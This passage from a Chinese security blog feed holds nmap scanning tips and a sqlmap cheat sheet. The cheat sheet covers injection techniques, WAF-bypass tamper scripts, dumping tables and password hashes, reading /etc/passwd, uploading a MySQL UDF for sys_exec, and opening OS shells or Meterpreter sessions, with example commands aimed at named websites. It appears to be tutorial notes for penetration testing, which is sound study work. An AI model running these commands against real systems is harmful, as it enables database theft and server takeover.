69端口上。使用上述命令可以探测出路由器是否开放TFTP。</p><p>nmap –sU –p69 –nvv target</p><p>扫描路由器操作系统：与通用PC扫描方式类似，使用-O选项扫描路由器的操作系统。-F用于快速扫描最可能开放的100个端口，并根据端口扫描结果进一步做OS的指纹分析。</p><p>nmap -O -F -n 192.168.1.1</p><p>显示网络上共有多少台 Linux 及 Win 设备:</p><p>nmap -F -O 192.168.1.1-255 | grep “Running: “ &gt; /tmp/os; echo “$(cat /tmp/os | grep Linux | wc -l) Linux device(s)”; echo “$(cat /tmp/os | grep Windows | wc -l) Window(s) devices”</p><h3 id="技巧-1"><a href="#技巧-1" class="headerlink" title="技巧"></a>技巧</h3><p>发送以太网数据包：nmap –send-eth ip</p><p>网络层发送：nmap –send-ip ip</p><p>假定拥有所有权：nmap –privileged ip</p><p>设置调试级别：nmap -d 1 ip</p><p>级别范围1-9，9为最高级，产生的数据最多，跟踪发送接受的报文:(-p指定端口范围，减少产生的报文)：nmap –packet-trace -p 20-30 ip</p><p>列举接口和路由:（多用于调试路由）：nmap -iflist ip</p><p>指定网络接口：指定从en0发送数据：nmap -e en0 ip</p><p>探测防火墙：nmap –script=firewalk –traceroute ip</p><h3 id="端口状态"><a href="#端口状态" class="headerlink" title="端口状态"></a>端口状态</h3><p>开放：Open</p><p>关闭：Closed</p><p>可能被过滤，可能网络阻塞：Filtered</p><p>可以访问，但未知端口处于开放还是关闭状态：Unfiltered</p><p>能确定端口事开放被过滤：Open|Filtered</p><p>不能确定端口事关闭还说被过滤：Closed|Filtered</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://www.freebuf.com/sectool/264941.html&quot;&gt;NMAP参数详解 - FreeBuf网络安全行业门户&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;记录一下nmap技巧和小知识&lt;/p&gt;</summary>
    
    
    
    <category term="nmap" scheme="http://example.com/categories/nmap/"/>
    
    <category term="渗透测试" scheme="http://example.com/categories/nmap/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    <category term="工具使用" scheme="http://example.com/categories/nmap/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
    
    <category term="渗透测试" scheme="http://example.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    <category term="nmap" scheme="http://example.com/tags/nmap/"/>
    
    <category term="工具使用" scheme="http://example.com/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>sqlmap</title>
    <link href="http://example.com/2022/07/30/sqlmap/"/>
    <id>http://example.com/2022/07/30/sqlmap/</id>
    <published>2022-07-30T12:04:42.000Z</published>
    <updated>2022-07-30T12:21:24.985Z</updated>
    
    <content type="html"><![CDATA[<h2 id="可测试参数"><a href="#可测试参数" class="headerlink" title="可测试参数"></a>可测试参数</h2><p>选项：-p，–skip 和 –param-exclude</p><p>默认情况下 sqlmap 会测试所有 GET 参数和 POST 参数。当 –level 的值 &gt;= 2，它还会测试 HTTP Cookie 头部值。当这个值 &gt;= 3 时，它还会测试 HTTP User-Agent 和 HTTP Referer 头部值。而且还可以手动指定一个需要 sqlmap 进行测试的、使用逗号分隔的参数列表。这会使 sqlmap 忽略 –level 的设置。<br>例如，只需要测试 GET 参数 id 和 HTTP User-Agent 时，则提供 -p “id,user-agent”。<br>如果用户想要排除测试某些参数，可以使用选项 –skip。如果需要使用高级别 –level 值，并指定部分可用参数（排除通常被测试的 HTTP 头）时，这个选项非常有用。<br>例如，要在 –level=5 跳过测试 HTTP User-Agent 和 HTTP Referer，可以提供 –skip=“user-agent,referer”。<br>还可以基于正则表达式针对参数名称来排除对某些参数的测试。在这种情况下，用户可以使用选项 –param-exclude。<br>例如，要跳过对名称中包含 token 或 session 的参数测试，可以提供 –param-exclude=”token|session”。</p><h2 id="测试会用到的sql技术"><a href="#测试会用到的sql技术" class="headerlink" title="测试会用到的sql技术"></a>测试会用到的sql技术</h2><p>使用方法</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--technique<span class="operator">=</span></span><br></pre></td></tr></table></figure><p>B：布尔型注入 Boolean-based blind<br>E：报错型注入 Error-based<br>U：联合查询注入 Union-query based<br>S：堆叠查询注入 Stacked queries<br>T：时间型盲注 Time-based blind<br>Q：内联查询注入 inline query</p><h3 id="指哪打哪"><a href="#指哪打哪" class="headerlink" title="指哪打哪"></a>指哪打哪</h3><p>–dbs 爆出所有数据库<br>–tables 爆出所有的表<br>–columns 爆出所有的列<br>–current-db 查看当前数据库<br>-D xxx -T xxx –columns<br>-D xxx -T xxx -C username –dump<br>-D xxx -T xxx -C username –dump –start 1 –stop 100 爆出前100个数据<br>-T xxx –dump-all 爆出table中所有的东西<br>–dbms MYSQL 指定mysql数据库类型</p><h3 id="写脚本来注入-tamper"><a href="#写脚本来注入-tamper" class="headerlink" title="写脚本来注入 tamper"></a>写脚本来注入 tamper</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Needed imports</span></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line"><span class="comment"># Define which is the order of application of tamper scripts against</span></span><br><span class="line"><span class="comment"># the payload</span></span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Description of your tamper script</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    <span class="comment"># your code to tamper the original payload</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># return the tampered payload</span></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py -u <span class="string">&quot;http://192.168.136.131/sqlmap/mysql/get_int.php?id=1&quot;</span> --\</span><br><span class="line">tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v <span class="number">3</span></span><br><span class="line"></span><br><span class="line">[hh:mm:03] [DEBUG] cleaning up configuration parameters</span><br><span class="line">[hh:mm:03] [INFO] loading tamper script <span class="string">&#x27;between&#x27;</span></span><br><span class="line">[hh:mm:03] [INFO] loading tamper script <span class="string">&#x27;randomcase&#x27;</span></span><br><span class="line">[hh:mm:03] [INFO] loading tamper script <span class="string">&#x27;space2comment&#x27;</span></span><br><span class="line">[...]</span><br><span class="line">[hh:mm:04] [INFO] testing <span class="string">&#x27;AND boolean-based blind - WHERE or HAVING clause&#x27;</span></span><br><span class="line">[hh:mm:04] [PAYLOAD] <span class="number">1</span>)/**/And/**/<span class="number">1369</span>=<span class="number">7706</span>/**/And/**/(<span class="number">4092</span>=<span class="number">4092</span></span><br><span class="line">[hh:mm:04] [PAYLOAD] <span class="number">1</span>)/**/AND/**/<span class="number">9267</span>=<span class="number">9267</span>/**/AND/**/(<span class="number">4057</span>=<span class="number">4057</span></span><br><span class="line">[hh:mm:04] [PAYLOAD] <span class="number">1</span>/**/AnD/**/<span class="number">950</span>=<span class="number">7041</span></span><br><span class="line">[...]</span><br><span class="line">[hh:mm:04] [INFO] testing <span class="string">&#x27;MySQL &gt;= 5.0 AND error-based - WHERE or HAVING clause</span></span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line">[hh:mm:04] [PAYLOAD] <span class="number">1</span>/**/anD/**/(SELeCt/**/<span class="number">9921</span>/**/fROm(SELeCt/**/counT(*),CONC</span><br><span class="line">AT(cHar(<span class="number">58</span>,<span class="number">117</span>,<span class="number">113</span>,<span class="number">107</span>,<span class="number">58</span>),(SELeCt/**/(case/**/whEN/**/(<span class="number">9921</span>=<span class="number">9921</span>)/**/THeN/**/<span class="number">1</span>/</span><br><span class="line">**/elsE/**/<span class="number">0</span>/**/ENd)),cHar(<span class="number">58</span>,<span class="number">106</span>,<span class="number">104</span>,<span class="number">104</span>,<span class="number">58</span>),FLOOR(RanD(<span class="number">0</span>)*<span class="number">2</span>))x/**/fROm/**/info</span><br><span class="line">rmation_schema.tables/**/group/**/bY/**/x)a)</span><br><span class="line">[hh:mm:04] [INFO] GET parameter <span class="string">&#x27;id&#x27;</span> <span class="keyword">is</span> <span class="string">&#x27;MySQL &gt;= 5.0 AND error-based - WHERE or</span></span><br><span class="line"><span class="string"> HAVING clause&#x27;</span> injectable</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><h2 id="trick"><a href="#trick" class="headerlink" title="trick"></a>trick</h2><p>在使用-v参数的时候，尽量选择，3级别，次级别可以显示注入的参数。 例如：sqlmap -v3 -u</p><table><thead><tr><th align="center"><strong>1</strong></th><th align="center">在使用-v参数的时候，尽量选择，3级别，次级别可以显示注入的参数。 例如：sqlmap -v3 -u <a href="http://www.potian.com/">www.potian.com</a></th></tr></thead><tbody><tr><td align="center"><strong>2</strong></td><td align="center">当一件知道数据库信息的时候，使用-d直接连接数据库，注意-D是指定目标库，要区分。 例如：-d mysql://POTIAN : 123123 @127.0.0.1:3306/ ORDER</td></tr><tr><td align="center"><strong>3</strong></td><td align="center">当使用Burp或WebScarab保存了日志的时候，想从日志文件中筛选目标，可使用-I使用 绝对路径地址即可。</td></tr><tr><td align="center"><strong>4</strong></td><td align="center">-g可以使用google的搜索结果，例如，直接搜索uid=，查找具有此参数的站点，直接使用sqlmap调用google结果，例：<strong>sqlmap</strong>  -g inurl:php?uid=。（收集了一些语句，在附表）当需要使用-g inurl:php?uid=等参数时，默认无法访问，可使用此参数+海外代理方式使用此功能。当代理需要验证的时候，使用-cre指定身份信息，需要使用代理轮巡时，使用文件加载代理设置列表，使用代理轮询也可在对访问ip次数进行了验证的场景使用。（鉴于我国国情，不建议使用）</td></tr><tr><td align="center"><strong>5</strong></td><td align="center">服务端允许的情况下，–method改变默认的http方法，和其他参数配合使用，例如–data，改变为post然后推送数据。</td></tr><tr><td align="center"><strong>6</strong></td><td align="center">默认情况下sqlmap的HTTP请求头中User-Agent值是：sqlmap/<em>.</em>-dev-xxxxxxx(<a href="http://sqlmap.org/">http://sqlmap.org</a>) 可以使用–user-agent参数来指定想使用的UA，同时也可以使用–random-agent参数来随机的从./txt/user-agents.txt中获取。当–level参数设定为3或者3以上的时候，会尝试对User-Angent进行注入.另外UA是绕过waf的参数，–user-agent=                –random-agent这两个参数可对waf针对恶意ua的防控进行绕过。</td></tr><tr><td align="center"><strong>7</strong></td><td align="center">指定http请求中的header里的host参数、在请求中伪造referer，有些waf和安全产品等会对refer进行限制，仅允许本站referer，当waf参数对referer进行了限制后，可使用此参数进行绕过。当–level参数设定为3或者3以上的时候会尝试对referer注入指定其他的header信息，XFF等，例如strust2-045使用了Content-Type</td></tr><tr><td align="center"><strong>8</strong></td><td align="center">HTTP代理身份验证凭据，可自动使用username：password和秘钥文件，例如有些访问会使用key文件，集团sso最爱出现此种场景，在这种身份验证凭据的需求中，也可使用-I参数使用burp等代理记录文件来使用身份凭据</td></tr><tr><td align="center"><strong>9</strong></td><td align="center">设置http请求间隔时间，在绕过需求时使用，例如单ip单位时间访问多少次，可配合代理和多代理参数使用。超时连接后的尝试间隔，默认30s，可手动调整，一般–timeout和–retries配合使用</td></tr><tr><td align="center"><strong>10</strong></td><td align="center">有的网站会对提交的参数进行编码或加密，这时候需要根据某个参数的变化，而修改另个一参数，才能形成正常的请求，这时可以用–eval参数在每次请求时根据所写python代码做完修改后请求。 例子：–eval=””import hashlib;hash=hashlib.md5(id).hexdigest()””上面的请求就是每次请求时根据id参数值，做一次md5后作为hash参数的值。”</td></tr><tr><td align="center"><strong>11</strong></td><td align="center">sqlmap默认测试所有的GET和POST参数，上文提到过，当–level的值大于等于2的时候也会测试HTTP Cookie头的值，大于等于3的时候也会测试User-Agent和HTTP Referer头的值。这时候可以手动指定-p参数设置想要测试的参数。 例如：-p “”id,cookie””但是有个别参数不想测试的时候可以使用–skip=“user-agent”参数。</td></tr><tr><td align="center"><strong>12</strong></td><td align="center">数值处理：参数：–invalid-bignum –invalid-logical这两个参数对报错数据、无效数据进行更改，例如默认报错UID=-20,可以通过制定以上参数制定无效的大数字和逻辑，比如uid=999999999和uid=20 and a=b 参数：–prefix,–suffix在注入的payload的前面或者后面加一些字符，来保证payload的正常执行，例如在语句中增加–prefix “”’)”” –suffix “”AND (’1’=’1””</td></tr><tr><td align="center"><strong>13</strong></td><td align="center">–tamper可从tamper库里查找相关内容，使用–tamper tamper/*.py方式指定</td></tr><tr><td align="center"><strong>14</strong></td><td align="center">上文多次解释–level对测试参数的影响，一共有五个等级，默认为1，sqlmap使用的payload可以在payloads.xml中看到，你也可以根据相应的格式添加自己的payload内容，默认也有一些，可定制。 –level的值大于等于2的时候也会测试HTTP Cookie头的值，大于等于3的时候也会测试User-Agent和HTTP Referer头的值，建议最高级别，会更慢、测试参数更复杂。</td></tr><tr><td align="center"><strong>15</strong></td><td align="center">risk从0-3共有四个风险等级，默认是1，risk1会测试大部分的测试语句，risk2会增加基于事件的测试语句，3会增加OR语句的注入测试。测试的语句同样可以在payloads.xml中找到，可以自行添加payload。 警告：当使用高级别时，可能会使用drop、update等高危语句对整表、整库造成影响，可能导致更新的整个表，可能造成很大的风险。</td></tr><tr><td align="center"><strong>16</strong></td><td align="center">“sqlmap测试结果取决于返回内容，当页面在刷新或更新后，可能导致返回不同的内容，特别是页面有动态内容的情况下。为了避免误报，可指定字符串或者正则表达式来区分原始页面和报错页面（–string参数添加字符串，–regexp添加正则），也可以提供一段字符串在原始页面与true下的页面都不存在的字符串，而false页面中存在的字符串（–not-string添加）。 用户也可以提供true与false返回的HTTP状态码不一样来注入，例如，响应200的时候为真，响应401的时候为假，–code=200。</td></tr><tr><td align="center"><strong>17</strong></td><td align="center">默认sqlmap会把BEUSTQ六中注入方式全来一遍，可根据实际情况进行调整，例如可使用时间延迟，看网站响应时间来判断是否有注入，可根据报错判断注入。如果不是很懂，就不用管，虽然时间长点，但很全面。  B:Boolean-based blind SQL injection（布尔型注入） E:Error-based SQL injection（报错型注入）  U:UNION query SQL injection（可联合查询注入）  S:Stacked queries SQL                injection（可多语句查询注入）  T: Time-based blind SQL injection（基于时间延迟注入）  Q: Inline SQL Injection (内联注入) 当使用基于时间延迟注入的盲注时，时刻使用–time-sec参数设定延时时间，默认是5秒，可以根据环境记性调整，比如网络延迟很大，可适当增加延时时间</td></tr><tr><td align="center"><strong>18</strong></td><td align="center">–union-cols设定的值为一段整数范围，制定区间，此数值默认为1-10，随着–levle增加，当为5的时候增加为50，当level级别和取值范围不匹配，在低级别需求更大的范围，可通过设定–union-cols的值来实现。设定union查询使用的字符，默认使用NULL，但是可能会返回失败，–union-char指定UNION查询的字符。指定查询的表，配合上文暴力破解的字符、范围等来详细使用。</td></tr><tr><td align="center"><strong>19</strong></td><td align="center">在一旦注入成功且获得精确信息通过以下详细参数来指定检索、枚举动作和动作执行对象：检索DBMS的指纹特征、数据库、host值、用户身份、并对用户、密码、权限、角色进行枚举也就是爆破。然后尝试枚举数据库、数据库里的表、数据库里的内容、可以使用count来统计条目等操作。dump和dump-all就是脱裤和全脱的区别，dump某表的十条八条可能没事儿，dump-all注定要浪迹天涯，也就是所谓的从脱裤到跑路的开始，通过-D-T-C来制定索要枚举的库、表、和列，使用-X来排除不想要的列，特别是有多列且有无意义字段的时候，使用-X可大大节省时间。                –exclude-sysdbs参数，将不会获取数据库自带的系统库内容，可减少干扰内容，对-count的使用和枚举信息的使用建议搭配此参数来排除系统库。 当我们不想跑路的时候，那么请使用下面内容：    –start=LIMITSTART First query output entry to retrieve指定从第几行开始输出，如： –start=1                   –stop=LIMITSTOP   Last query output entry to retrieve 指定从第几行停止输出 –stop=10  –first=FIRSTCHAR   First query output word character                to retrieve 指定从第几个字符开始输出 –first 1    –last=LASTCHAR Last query output word character to retrieve 指定从第几个字符停止输出–last10</td></tr><tr><td align="center"><strong>20</strong></td><td align="center">暴力检查：猜测检查常见的、通用的表名和列名，可通过下面两个文件进行定制化，暴力破解的表在txt/common-tables.txt文件中，暴力破解的列名在txt/common-columns.txt中</td></tr><tr><td align="center"><strong>21</strong></td><td align="center">对文件系统、操作系统的交互和使用必须需要相应的权限，前面提到要求具有特定的函数执行特权，一般要求root。针对文件系统的读写：对–file-read配置绝对系统路径，可读取相应文件内容，可以是文本，也可以是二进制，条件是必须拥有相对应特权，已知的是mysql、postgresql和sqlserver。写入也是同样，往远端后台的DBMS里写入一个本地文件，可通过–file-dest指定绝对文件路径。” 当然和上面可以配合使用，当数据库为MySQL，PostgreSQL或Microsoft                SQL Server，并且当前用户有权限使用特定的函数。然后通过上面的文件系统管理上传一个库，使用可执行系统命令的sys_exec()和sys_eval()，甚至xp_cmdshell存储过程 –os-shell参数也可以模拟一个真实的shell，可以输入你想执行的命令。 Meterpreter配合使用 –os-pwn，–os-smbrelay，–os-bof，–priv-esc，–msf-path，–tmp-path配合Meterpreter使用，当前用户有权限使用特定的函数，可以在数据库与攻击者直接建立TCP连接，这个连接可以是一个交互式命令行的Meterpreter会话，sqlmap根据Metasploit生成shellcode，四种方式执行它：  1.通过用户自定义的sys_bineval()函数在内存中执行Metasplit的shellcode，支持MySQL和PostgreSQL数据库，参数：–os-pwn。  2.通过用户自定义的函数上传一个独立的payload执行，MySQL和PostgreSQL的sys_exec()函数，Microsoft                SQL Server的xp_cmdshell()函数，参数：–os-pwn。 3.通过SMB攻击(MS08-068)来执行Metasploit的shellcode，当sqlmap获取到的权限足够高的时候（Linux/Unix的uid=0，Windows是Administrator），–os-smbrelay。 4.通过溢出Microsoft SQL Server 2000和2005的sp_replwritetovarbin存储过程(MS09-004)，在内存中执行Metasploit的payload，参数：–os-bof。</td></tr><tr><td align="center"><strong>22</strong></td><td align="center">所见即所得，注册表连接指的是windows系统，相信大家都有windows系统知识，不懂注册表基本就不懂windows系统，所有的windows系统配置在注册表里都可实现，比如开启远程连接、比如新建用户、比如组策略配置、比如防火墙等等，reg可对注册表内容进行读取、编辑、和删除，上面和下面相配合可实现对指定的key、value、data和类型进行操作。</td></tr><tr><td align="center"><strong>23</strong></td><td align="center">–batch 在使用sqlmap时，有时一些响应需要用户交互，输入Y、N、skip、quit等，使用此选项可使用默认配置。  –output-dir=  指定输出路径，方式控制台输出过多，无法查看，也方便记录  –gpage=GOOGLEPAGE  好像默认是使用google搜索的前100个文件，当使用前面的-g参数，配合此参数指定页面  –identify-waf  进行WAF/IPS/IDS保护测试，目前大约支持30种产品的识别  –mobile  使用移动产品UA，把sqlmap伪装成手机，也可使用前面的 -user-agent 自己指定  –smart  智能深度启发式扫描，或许会有惊喜呢。  –wizard 和上面的完全不同，纯新手选择，一步步让你输入url等参数，基本输入个url就行。</td></tr></tbody></table><h2 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h2><table><thead><tr><th align="center"><strong>1</strong></th><th align="center">手工基本检测和判断（在注入点使用or、and等可判断是否有注入点）</th><th align="center">原始网页：<a href="http://www.potian.com/mysql/product/user_info.php?uid=1">http://www.potian.com/mysql/product/user_info.php?uid=1</a> 024 构造url1：<a href="http://www.potian.com/mysql/product/user_info.php?uid=1">http://www.potian.com/mysql/product/user_info.php?uid=1</a> 024+AND+1=1 构造url2：<a href="http://www.potian.com/mysql/product/user_info.php?uid=1">http://www.potian.com/mysql/product/user_info.php?uid=1</a> 024+AND+1=1 025</th></tr></thead><tbody><tr><td align="center"><strong>2</strong></td><td align="center">基础检测语法</td><td align="center">sqlmap.py -u <a href="http://www.potian.com/mysql/product/user_info.php?uid=1">http://www.potian.com/mysql/product/user_info.php?uid=1</a> 024</td></tr><tr><td align="center"><strong>3</strong></td><td align="center">批量检测</td><td align="center">“sqlmap.py -m target.txt”，注意target.txt跟sqlmap在同一个目录下。</td></tr><tr><td align="center"><strong>4</strong></td><td align="center">绕过WAF进行SQL注入</td><td align="center">（1）修改\sqlmap\tamper\halfversionedmorekeywords.py return match.group().replace(word, ”/<em>!0%s” % word) 为：return match.group().replace(word, ”/</em>!50000%s*/” % word)  （2）修改\sqlmap\xml\queries.xml &lt;cast query= ”CAST(%s ASCHAR)”/&gt;为：&lt;castquery=                ”convert(%s,CHAR)”/&gt;  （3）使用sqlmap进行注入测试sqlmap.py -u ”<a href="http://www.potian.com/detail.php">http://www.potian.com/detail.php</a>? id=16″ –tamper “halfversionedmorekeywords.py”  其它绕过waf脚本方法：sqlmap.py-u “ <a href="http://www.potian.com/mysql/product/user_info.php?uid=1">http://www.potian.com/mysql/product/user_info.php?uid=1</a> 024”                –tampertamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3  （4）tamper目录下文件具体含义： space2comment.py 用/<strong>/代替空格 apostrophemask.py 用utf8代替引号 equaltolike.pylike 代替等号 space2dash.py 绕过过滤‘=’ 替换空格字符（”），（’–‘）后跟一个破折号注释，一个随机字符串和一个新行（’n’）  greatest.py 绕过过滤’&gt;’ ，用GREATEST替换大于号。 space2hash.py  空格替换为#号,随机字符串以及换行符  apostrophenullencode.py  绕过过滤双引号，替换字符和双引号。  halfversionedmorekeywords.py  当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论  space2morehash.py  空格替换为#号 以及更多随机字符串 换行符  appendnullbyte.py   在有效负荷结束位置加载零字节字符编码  ifnull2ifisnull.py 绕过对IFNULL过滤，替换类似’IFNULL(A,B)’为’IF(ISNULL(A), B, A)’ space2mssqlblank.py(mssql) 空格替换为其它空符号  base64encode.py 用base64编码替换  space2mssqlhash.py 替换空格  modsecurityversioned.py  过滤空格，包含完整的查询版本注释  space2mysqlblank.py 空格替换其它空白符号(mysql)  between.py  用between替换大于号（&gt;） space2mysqldash.py  替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）  multiplespaces.py  围绕SQL关键字添加多个空格  space2plus.py  用+替换空格  bluecoat.py  代替空格字符后与一个有效的随机空白字符的SQL语句,然后替换=为like  nonrecursivereplacement.py 双重查询语句，取代SQL关键字  space2randomblank.py  代替空格字符（“”）从一个随机的空白字符可选字符的有效集  sp_password.py  追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾  chardoubleencode.py  双url编码(不处理以编码的)  unionalltounion.py  替换UNION ALLSELECT UNION SELECT  charencode.py url编码  randomcase.py   随机大小写  unmagicquotes.py  宽字符绕过  GPCaddslashes randomcomments.py  用/</strong>/分割sql关键字  charunicodeencode.py  字符串unicode编码  securesphere.py  追加特制的字符串  versionedmorekeywords.py  注释绕过 space2comment.py  替换空格字符串(‘‘) 使用注释‘/**/’  halfversionedmorekeywords.py   关键字前加注释</td></tr><tr><td align="center"><strong>5</strong></td><td align="center">URL重写SQL注入测试</td><td align="center">value1为测试参数，加“*”即可，sqlmap将会测试value1的位置是否可注入。 sqlmap.py -u ” <a href="http://www.potian.com/param1/value1">http://www.potian.com/param1/value1</a> */param2/value2/”</td></tr><tr><td align="center"><strong>6</strong></td><td align="center">列举并破解密码哈希值</td><td align="center">当前用户有权限读取包含用户密码的权限时，sqlmap会现列举出用户，然后列出hash，并尝试破解。 sqlmap.py -u ” <a href="http://www.potian.com/sqlmap/pgsql/get_int.php?id=1">http://www.potian.com/sqlmap/pgsql/get_int.php?id=1</a> ” –passwords -v1</td></tr><tr><td align="center"><strong>7</strong></td><td align="center">获取表中的数据个数</td><td align="center">sqlmap.py -u ” <a href="http://www.potian.com/sqlmap/mssql/iis/get_int.asp?id=1">http://www.potian.com/sqlmap/mssql/iis/get_int.asp?id=1</a> ” –count -Dtestdb</td></tr><tr><td align="center"><strong>8</strong></td><td align="center">站点爬取</td><td align="center">sqlmap.py -u “ <a href="http://www.secbang.com/">http://www.secbang.com</a> “–batch –crawl=3</td></tr><tr><td align="center"><strong>9</strong></td><td align="center">注入时间预估（基于布尔）</td><td align="center">sqlmap.py -u “ <a href="http://www.secbang.com/sqlmap/oracle/get_int_bool.php?id=1">http://www.secbang.com/sqlmap/oracle/get_int_bool.php?id=1</a> “-b –eta</td></tr><tr><td align="center"><strong>10</strong></td><td align="center">使用hex避免字符编码导致数据丢失</td><td align="center">sqlmap.py -u “ <a href="http://www.secbang.com/pgsql/get_int.php?id=1">http://www.secbang.com/pgsql/get_int.php?id=1</a> ” –banner –hex -v 3 –parse-errors</td></tr><tr><td align="center"><strong>11</strong></td><td align="center">模拟测试手机环境站点</td><td align="center">python sqlmap.py -u ” <a href="http://www.secbang.com/vuln.php?id=1">http://www.secbang.com/vuln.php?id=1</a> ” –mobile</td></tr><tr><td align="center"><strong>12</strong></td><td align="center">智能判断测试</td><td align="center">sqlmap.py -u “ <a href="http://www.secbang.com/info.php?id=1">http://www.secbang.com/info.php?id=1</a> “–batch –smart</td></tr><tr><td align="center"><strong>13</strong></td><td align="center">结合burpsuite进行注入</td><td align="center">sqlmap.py -r burpsuite 抓包.txt</td></tr><tr><td align="center"><strong>14</strong></td><td align="center">sqlmap 自动填写表单注入</td><td align="center">sqlmap.py -u URL –forms sqlmap.py -u URL –forms –dbs sqlmap.py -u URL –forms –current-db sqlmap.py -u URL –forms -D 数据库名称–tables sqlmap.py -u URL –forms -D 数据库名称 -T 表名 –columns sqlmap.py -u URL –forms -D 数据库名称 -T 表名 -Cusername，password –dump</td></tr><tr><td align="center"><strong>15</strong></td><td align="center">读取linux下文件</td><td align="center">sqlmap.py-u “url” –file /etc/password</td></tr><tr><td align="center"><strong>16</strong></td><td align="center">sqlmap cookies 注入</td><td align="center">sqlmap.py -u “ <a href="http://www.potian.com/mysql/product/user_info.php?uid=1">http://www.potian.com/mysql/product/user_info.php?uid=1</a> 024“–cookies “ssuid=*″ –dbs –level 3 sqlmap.py -u 注入点URL –cookie”id=xx” –level 3 sqlmap.py -u                url –cookie “id=xx”–level 3 –tables( 猜表名) sqlmap.py -u url –cookie “id=xx”–level 3 -T 表名 –coiumns sqlmap.py -u url –cookie “id=xx”–level 3 -T 表名 -C username，password –dump</td></tr><tr><td align="center"><strong>17</strong></td><td align="center">连接mysql数据打开一个交互shell</td><td align="center">sqlmap.py -dmysql://potian:123123@<a href="http://www.potian.com:3306/sqlmap">www.potian.com:3306/sqlmap</a> –sql-shell select @@version; select @@plugin_dir;</td></tr><tr><td align="center"><strong>18</strong></td><td align="center">利用sqlmap上传lib_mysqludf_sys到MySQL插件目录</td><td align="center">sqlmap.py -dmysql://potian:123123@<a href="http://www.potian.com:3306/sqlmap">www.potian.com:3306/sqlmap</a> –file-write=d:/tmp/lib_mysqludf_sys.dll–file-dest=d:\wamp2.5\bin\mysql\mysql5.6.17\lib\plugin\lib_mysqludf_sys.dll CREATE                FUNCTION sys_exec RETURNS STRINGSONAME ‘lib_mysqludf_sys.dll’ CREATE FUNCTION sys_eval RETURNS STRINGSONAME ‘lib_mysqludf_sys.dll’ select sys_eval(‘ver’);</td></tr><tr><td align="center"><strong>19</strong></td><td align="center">执行shell命令</td><td align="center">sqlmap.py -u “url” –os-cmd=”netuser” /<em>执行net user命令</em>/ sqlmap.py -u “url” –os-shell /<em>系统交互的shell</em>/</td></tr><tr><td align="center"><strong>20</strong></td><td align="center">延时注入</td><td align="center">sqlmap –dbs -u”url” –delay 0.5 /* 延时0.5秒*/ sqlmap –dbs -u”url” –safe-freq /* 请求2次*/</td></tr></tbody></table><h2 id="跑流量包"><a href="#跑流量包" class="headerlink" title="跑流量包"></a>跑流量包</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap<span class="selector-class">.py</span> -r 流量包<span class="selector-class">.txt</span>  </span><br></pre></td></tr></table></figure><h2 id="useful"><a href="#useful" class="headerlink" title="useful"></a>useful</h2><p><a href="https://blog.csdn.net/qq_53755216/article/details/118763451">https://blog.csdn.net/qq_53755216/article/details/118763451</a></p><p><a href="https://github.com/godrun666/Advanced-SQL-Injection-Cheatsheet">godrun666/Advanced-SQL-Injection-Cheatsheet: A cheat sheet that contains advanced queries for SQL Injection of all types. (github.com)</a></p><p><a href="https://www.freebuf.com/sectool/245314.html">说一说：Sqlmap参数 - FreeBuf网络安全行业门户</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;可测试参数&quot;&gt;&lt;a href=&quot;#可测试参数&quot; class=&quot;headerlink&quot; title=&quot;可测试参数&quot;&gt;&lt;/a&gt;可测试参数&lt;/h2&gt;&lt;p&gt;选项：-p，–skip 和 –param-exclude&lt;/p&gt;
&lt;p&gt;默认情况下 sqlmap 会测试所有 GET</summary>
      
    
    
    
